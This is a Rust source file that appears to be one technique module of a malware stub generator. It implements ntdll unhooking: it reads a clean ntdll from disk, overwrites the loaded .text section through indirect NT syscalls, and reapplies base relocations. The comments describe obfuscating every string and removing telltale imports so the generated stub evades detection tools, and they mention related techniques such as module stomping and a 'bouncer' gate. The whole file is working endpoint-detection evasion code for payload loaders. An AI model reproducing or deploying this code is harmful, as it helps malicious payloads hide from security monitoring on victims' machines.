// --- ntdll unhook (technique fragment) ---
//
// This file is injected verbatim into the generated stub when the technique is
// selected. It must be a self-contained Rust snippet: its own `use` statements
// plus the functions/constants the technique needs.
//
// A per-build value is rendered as a dollar-delimited placeholder token that
// `Params::render_fragment` replaces with the actual value. The delimiter is
// not valid Rust outside a macro, so `rustfmt` cannot parse the file and leaves
// the tokens untouched. Do NOT switch the delimiter to double braces: those are
// valid Rust (nested blocks) and `rustfmt` silently rewrites them, breaking the
// substitution.
//
// Every string that reaches the generated stub must be built through
// `StringsConfig::obfuscate` (see `src/techniques/README.md`).
//
// What the fragment does:
//   1. fetches the loaded module's base with `GetModuleHandleA` (a loader entry
//      point, like `LoadLibraryA` in `module_stomping`: the `nt_*` layer issues
//      kernel calls, it does not map images),
//   2. reads a clean copy of the same file from disk with `std::fs::read`,
//   3. walks the *file's* PE headers to the code section (`.text`), keeping the
//      section's RVA, virtual size, raw size and raw offset,
//   4. makes exactly the live section's bytes writable through
//      `crate::nt_protect_vm` (so `mode: indirect` removes the `VirtualProtect`
//      import) and copies the clean bytes over them — the window stays
//      executable because the protection call itself returns through the
//      section being rewritten,
//   5. applies the base relocations the loader would have applied to that
//      section (x86 code carries absolute addresses; x64 ntdll has none),
//   6. restores the original protection, so the section is executable — and not
//      writable — again before the next step runs.
//
// Only the section is ever touched: the PE headers keep the offsets the system
// loader already resolved, so every export still points where it did, and the
// rest of the image (data, relocations, the export directory) is left alone.

use std::ffi::c_void;
use std::ptr;

use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::GetModuleHandleA;
use windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
use windows::Win32::System::Threading::GetCurrentProcess;

/// `IMAGE_DOS_SIGNATURE` ("MZ") and `IMAGE_NT_SIGNATURE` ("PE\0\0").
const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
const IMAGE_NT_SIGNATURE: u32 = 0x0000_4550;

/// `IMAGE_DOS_HEADER::e_lfanew`: the NT header's offset.
const E_LFANEW_OFFSET: usize = 0x3C;

/// `IMAGE_SIZEOF_SECTION_HEADER`: the distance between two section headers.
const SECTION_HEADER_SIZE: usize = 40;

/// `IMAGE_NT_HEADERS` up to the optional header (signature + `IMAGE_FILE_HEADER`),
/// and the two file-header fields the walk needs: `NumberOfSections` and
/// `SizeOfOptionalHeader`. Both offsets are the same in PE32 and PE32+.
const NT_HEADERS_FIXED: usize = 24;
const NUM_SECTIONS_OFFSET: usize = 6;
const OPTIONAL_HEADER_SIZE_OFFSET: usize = 20;

/// `IMAGE_OPTIONAL_HEADER` fields the walk needs: the magic (PE32 vs PE32+),
/// the preferred `ImageBase` (u32 in PE32, u64 in PE32+), and the offset of the
/// data directories (which differs by header size).
const OPTIONAL_MAGIC_PE32: u16 = 0x10B;
const OPTIONAL_MAGIC_PE32_PLUS: u16 = 0x20B;
const OPTIONAL_IMAGE_BASE_OFFSET_PE32: usize = 28;
const OPTIONAL_IMAGE_BASE_OFFSET_PE32_PLUS: usize = 24;
const OPTIONAL_DATA_DIRECTORY_OFFSET_PE32: usize = 96;
const OPTIONAL_DATA_DIRECTORY_OFFSET_PE32_PLUS: usize = 112;

/// `IMAGE_DIRECTORY_ENTRY_BASERELOC` (index 5) in the data directory.
const DIRECTORY_ENTRY_BASE_RELOC: usize = 5;
const DATA_DIRECTORY_ENTRY_SIZE: usize = 8;

/// `IMAGE_SECTION_HEADER` fields the walk needs: `Misc.VirtualSize`,
/// `VirtualAddress`, `SizeOfRawData` and `PointerToRawData`.
const SECTION_VIRTUAL_SIZE_OFFSET: usize = 8;
const SECTION_VIRTUAL_ADDRESS_OFFSET: usize = 12;
const SECTION_RAW_SIZE_OFFSET: usize = 16;
const SECTION_RAW_PTR_OFFSET: usize = 20;

/// Base-relocation types: the padding entry, the 4-byte absolute address of a
/// PE32 image and the 8-byte absolute address of a PE32+ image.
const RELOC_ABSOLUTE: u32 = 0;
const RELOC_HIGHLOW: u32 = 3;
const RELOC_DIR64: u32 = 10;

/// The code section's name (`.text`), compared as its 8-byte little-endian
/// value. A byte pattern instead of a string literal, so the section name is a
/// compile-time constant and never reaches `.rdata`.
const CODE_SECTION_NAME: u64 = u64::from_le_bytes([b'.', b't', b'e', b'x', b't', 0, 0, 0]);

/// The clean code section read out of the file: where its bytes are, where they
/// belong in the loaded image, and how to fix them up like the loader did.
struct CleanText {
    /// Offset of the section's raw data inside the file.
    raw_offset: usize,
    /// How many bytes to copy: the smaller of the section's virtual and raw
    /// sizes, so the copy never reads past the file or past the mapped section.
    copy_len: usize,
    /// `VirtualAddress` of the section, relative to the image base.
    target_rva: usize,
    /// Preferred image base from the file's optional header.
    preferred_base: u64,
    /// Whether the file is PE32+ (8-byte relocation fields) or PE32 (4-byte).
    pe32_plus: bool,
    /// Raw file range of the base-relocation directory (`reloc_size == 0` when
    /// the image has none).
    reloc_offset: usize,
    reloc_size: usize,
}

/// Appends a failed `nt_*` call's NTSTATUS to an obfuscated message.
fn with_status(message: String, status: i32) -> String {
    format!("{message} (status 0x{:08x})", status as u32)
}

/// Reads a `u16` out of the clean file, refusing to read past its end.
///
/// The walk below can only leave the buffer on a malformed image, and reporting
/// that beats faulting the stub. Every offset is checked before it is added to,
/// so a bogus header value cannot wrap the arithmetic on a 32-bit stub either.
fn read_u16(file: &[u8], offset: usize) -> Result<u16, String> {
    let end = offset.checked_add(2).ok_or_else(|| $MSG_MALFORMED$)?;
    let bytes = file.get(offset..end).ok_or_else(|| $MSG_MALFORMED$)?;
    Ok(u16::from_le_bytes([bytes[0], bytes[1]]))
}

/// Reads a `u32` out of the clean file (see [`read_u16`]).
fn read_u32(file: &[u8], offset: usize) -> Result<u32, String> {
    let end = offset.checked_add(4).ok_or_else(|| $MSG_MALFORMED$)?;
    let bytes = file.get(offset..end).ok_or_else(|| $MSG_MALFORMED$)?;
    Ok(u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]))
}

/// Reads an 8-byte field (a section name) out of the clean file (see
/// [`read_u16`]).
fn read_u64(file: &[u8], offset: usize) -> Result<u64, String> {
    let end = offset.checked_add(8).ok_or_else(|| $MSG_MALFORMED$)?;
    let bytes = file.get(offset..end).ok_or_else(|| $MSG_MALFORMED$)?;
    Ok(u64::from_le_bytes([
        bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5], bytes[6], bytes[7],
    ]))
}

/// Converts a PE RVA to a file offset using the section table.
fn rva_to_offset(file: &[u8], rva: usize) -> Result<usize, String> {
    let nt = read_u32(file, E_LFANEW_OFFSET)? as usize;
    if nt > file.len().saturating_sub(NT_HEADERS_FIXED) {
        return Err($MSG_MALFORMED$);
    }
    let count = read_u16(file, nt + NUM_SECTIONS_OFFSET)? as usize;
    let optional_size = read_u16(file, nt + OPTIONAL_HEADER_SIZE_OFFSET)? as usize;
    let table = nt + NT_HEADERS_FIXED + optional_size;

    for i in 0..count {
        let section = table + i * SECTION_HEADER_SIZE;
        let virtual_address = read_u32(file, section + SECTION_VIRTUAL_ADDRESS_OFFSET)? as usize;
        let raw_size = read_u32(file, section + SECTION_RAW_SIZE_OFFSET)? as usize;
        let raw_offset = read_u32(file, section + SECTION_RAW_PTR_OFFSET)? as usize;
        if rva >= virtual_address && rva - virtual_address < raw_size {
            return raw_offset
                .checked_add(rva - virtual_address)
                .ok_or_else(|| $MSG_MALFORMED$);
        }
    }
    Err($MSG_MALFORMED$)
}

/// Finds the code section inside the clean file image.
///
/// The walk is bounds-checked throughout, so a truncated or malformed file is
/// reported instead of faulting the stub. A section whose raw data does not fit
/// the file is refused: the copy would otherwise read past the buffer. Nothing
/// is ever truncated or skipped silently.
fn find_clean_text(file: &[u8]) -> Result<CleanText, String> {
    if read_u16(file, 0)? != IMAGE_DOS_SIGNATURE {
        return Err($MSG_MALFORMED$);
    }
    let nt = read_u32(file, E_LFANEW_OFFSET)? as usize;
    // Keep the fixed part of the NT headers inside the file before adding the
    // optional-header size to it.
    if nt > file.len().saturating_sub(NT_HEADERS_FIXED) {
        return Err($MSG_MALFORMED$);
    }
    if read_u32(file, nt)? != IMAGE_NT_SIGNATURE {
        return Err($MSG_MALFORMED$);
    }

    let optional = nt + NT_HEADERS_FIXED;
    let magic = read_u16(file, optional)?;
    let (pe32_plus, image_base_offset, data_directory_offset) = match magic {
        OPTIONAL_MAGIC_PE32_PLUS => (
            true,
            OPTIONAL_IMAGE_BASE_OFFSET_PE32_PLUS,
            OPTIONAL_DATA_DIRECTORY_OFFSET_PE32_PLUS,
        ),
        OPTIONAL_MAGIC_PE32 => (
            false,
            OPTIONAL_IMAGE_BASE_OFFSET_PE32,
            OPTIONAL_DATA_DIRECTORY_OFFSET_PE32,
        ),
        _ => return Err($MSG_MALFORMED$),
    };
    let preferred_base = if pe32_plus {
        read_u64(file, optional + image_base_offset)?
    } else {
        read_u32(file, optional + image_base_offset)? as u64
    };

    // The base-relocation directory: a PE32 image needs it applied to the
    // restored section (its code carries absolute addresses), a PE32+ image
    // usually has none there.
    let reloc_entry = optional + data_directory_offset + DIRECTORY_ENTRY_BASE_RELOC * DATA_DIRECTORY_ENTRY_SIZE;
    let reloc_rva = read_u32(file, reloc_entry)? as usize;
    let reloc_size = read_u32(file, reloc_entry + 4)? as usize;
    let (reloc_offset, reloc_size) = if reloc_rva == 0 || reloc_size == 0 {
        (0, 0)
    } else {
        (rva_to_offset(file, reloc_rva)?, reloc_size)
    };

    let count = read_u16(file, nt + NUM_SECTIONS_OFFSET)? as usize;
    let optional_size = read_u16(file, nt + OPTIONAL_HEADER_SIZE_OFFSET)? as usize;
    let mut section = nt + NT_HEADERS_FIXED + optional_size;

    for _ in 0..count {
        if read_u64(file, section)? == CODE_SECTION_NAME {
            let virtual_size = read_u32(file, section + SECTION_VIRTUAL_SIZE_OFFSET)? as usize;
            let target_rva = read_u32(file, section + SECTION_VIRTUAL_ADDRESS_OFFSET)? as usize;
            let raw_size = read_u32(file, section + SECTION_RAW_SIZE_OFFSET)? as usize;
            let raw_offset = read_u32(file, section + SECTION_RAW_PTR_OFFSET)? as usize;

            if virtual_size == 0 || raw_size == 0 {
                return Err($MSG_TEXT_EMPTY$);
            }
            // The raw range must lie inside the file: a section that does not
            // fit is a build mismatch, never a partial copy.
            let end = raw_offset
                .checked_add(raw_size)
                .ok_or_else(|| $MSG_TEXT_TRUNCATED$)?;
            if end > file.len() {
                return Err($MSG_TEXT_TRUNCATED$);
            }

            return Ok(CleanText {
                raw_offset,
                copy_len: virtual_size.min(raw_size),
                target_rva,
                preferred_base,
                pe32_plus,
                reloc_offset,
                reloc_size,
            });
        }
        section += SECTION_HEADER_SIZE;
    }
    Err($MSG_NO_TEXT$)
}

/// Applies the base relocations that fall inside the restored section.
///
/// A PE32 image stores absolute addresses in its code, and the loader rewrites
/// each of them to the base it actually mapped the image at. The clean file
/// bytes still hold the preferred-base values, so every fixup inside the
/// restored range has to be shifted by `live_base - preferred_base`; skipping
/// this leaves a section whose absolute addresses point at the file's preferred
/// base (measured on x86: ~9 500 fixups in ntdll's `.text`). PE32+ ntdll uses
/// RIP-relative code and has no fixups inside `.text`, so the walk is a no-op
/// there, but it is applied for both formats.
///
/// `target` points at the already-copied, writable section.
fn apply_section_relocations(
    file: &[u8],
    clean: &CleanText,
    live_base: usize,
    target: *mut u8,
) -> Result<(), String> {
    if clean.reloc_size == 0 {
        return Ok(());
    }
    let width = if clean.pe32_plus { 8 } else { 4 };
    let delta = (live_base as u64).wrapping_sub(clean.preferred_base);
    let section_start = clean.target_rva;
    let section_end = section_start
        .checked_add(clean.copy_len)
        .ok_or_else(|| $MSG_MALFORMED$)?;

    let end = clean
        .reloc_offset
        .checked_add(clean.reloc_size)
        .ok_or_else(|| $MSG_MALFORMED$)?;
    let mut offset = clean.reloc_offset;
    while offset.checked_add(8).is_some_and(|probe| probe <= end) {
        let page_rva = read_u32(file, offset)? as usize;
        let block_size = read_u32(file, offset + 4)? as usize;
        let next = offset
            .checked_add(block_size)
            .ok_or_else(|| $MSG_MALFORMED$)?;
        if block_size < 8 || next > end {
            return Err($MSG_MALFORMED$);
        }

        for i in 0..(block_size - 8) / 2 {
            let entry = read_u16(file, offset + 8 + i * 2)?;
            let kind = (entry >> 12) as u32;
            let Some(rva) = page_rva.checked_add((entry & 0x0fff) as usize) else {
                return Err($MSG_MALFORMED$);
            };
            let Some(rva_end) = rva.checked_add(width) else {
                return Err($MSG_MALFORMED$);
            };
            if rva < section_start || rva_end > section_end {
                // The fixup is outside the restored section: not our business.
                continue;
            }

            let field = (target as usize + (rva - section_start)) as *mut u8;
            match kind {
                RELOC_ABSOLUTE => {}
                RELOC_HIGHLOW if !clean.pe32_plus => {
                    // SAFETY: `field` is inside the section and `width` bytes
                    // wide; the page is writable (the caller's copy window).
                    let value = unsafe { ptr::read_unaligned(field as *const u32) } as u64;
                    unsafe {
                        ptr::write_unaligned(field as *mut u32, value.wrapping_add(delta) as u32)
                    };
                }
                RELOC_DIR64 if clean.pe32_plus => {
                    // SAFETY: as above, with the 8-byte field of a PE32+ image.
                    let value = unsafe { ptr::read_unaligned(field as *const u64) };
                    unsafe { ptr::write_unaligned(field as *mut u64, value.wrapping_add(delta)) };
                }
                _ => return Err($MSG_RELOCATION$),
            }
        }
        offset = next;
    }
    Ok(())
}

/// Restores the loaded module's code section from the clean copy on disk.
///
/// The module name and the clean copy's path are substituted at build time by
/// `Params::render_fragment` with code that rebuilds them at runtime, so
/// neither the DLL name nor the path appears in `strings`. Every diagnostic is
/// obfuscated the same way.
pub fn unhook_ntdll() -> Result<bool, String> {
    let module_name: String = $NTDLL_DEF$;
    let path: String = $NTDLL_PATH_DEF$;
    crate::tech_dbg!("unhook_ntdll", "restoring the loaded module from disk");

    // 1. The module is already loaded (the stub itself links against it), so
    //    this only fetches its base address.
    let module_name_c =
        std::ffi::CString::new(module_name.as_str()).map_err(|_| $MSG_MODULE_NOT_FOUND$)?;
    let module = match unsafe { GetModuleHandleA(PCSTR(module_name_c.as_ptr() as *const u8)) } {
        Ok(module) => module,
        Err(_) => return Err($MSG_MODULE_NOT_FOUND$),
    };

    // 2. Read the clean copy. For a 32-bit stub the WOW64 filesystem redirector
    //    maps System32 to SysWOW64, so the same path resolves to the 32-bit
    //    image the process actually mapped (see the README).
    let file = std::fs::read(&path).map_err(|_| $MSG_READ_FAILED$)?;

    // 3. Locate the clean `.text` and where it goes in the loaded image.
    let clean = find_clean_text(&file)?;
    let target = (module.0 as usize)
        .checked_add(clean.target_rva)
        .ok_or_else(|| $MSG_MALFORMED$)?;

    // 4. Make exactly the section's bytes writable. The window has to stay
    //    executable: this call returns through ntdll's own
    //    `NtProtectVirtualMemory` stub, which lives inside the region being
    //    protected, so dropping execute permission would fault on the syscall's
    //    return path (measured; see the README). The original protection is
    //    restored right after the copy, so the section is not left writable.
    let process = unsafe { GetCurrentProcess() };
    let mut old_protect = 0u32;
    let status = crate::nt_protect_vm(
        process,
        target as *mut c_void,
        clean.copy_len,
        PAGE_EXECUTE_READWRITE.0,
        &mut old_protect,
    );
    if status < 0 {
        return Err(with_status($MSG_PROTECT_FAILED$, status));
    }

    // SAFETY: `file` holds at least `raw_offset + copy_len` bytes (checked in
    // `find_clean_text`), `target` points into the module mapped at step 1, and
    // the pages covering `copy_len` bytes from it are writable (step 4). The
    // two regions are separate allocations, so they cannot overlap.
    unsafe {
        ptr::copy_nonoverlapping(
            file.as_ptr().add(clean.raw_offset),
            target as *mut u8,
            clean.copy_len,
        )
    };

    // 5. Apply the fixups the loader applied to this section when it mapped the
    //    image, so the restored bytes are valid at the module's actual base.
    apply_section_relocations(&file, &clean, module.0 as usize, target as *mut u8)?;

    // 6. Restore what the loader had, so the section is executable — and no
    //    longer writable — before the next step runs.
    let mut restored = 0u32;
    let status = crate::nt_protect_vm(
        process,
        target as *mut c_void,
        clean.copy_len,
        old_protect,
        &mut restored,
    );
    if status < 0 {
        return Err(with_status($MSG_RESTORE_FAILED$, status));
    }

    crate::tech_dbg!(
        "unhook_ntdll",
        "restored {} bytes at {target:#x}",
        clean.copy_len
    );
    // A Preparation always continues the pipeline unless it declines the host;
    // only the `bouncer` gate returns `Ok(false)` (see `techniques/README.md`).
    Ok(true)
}
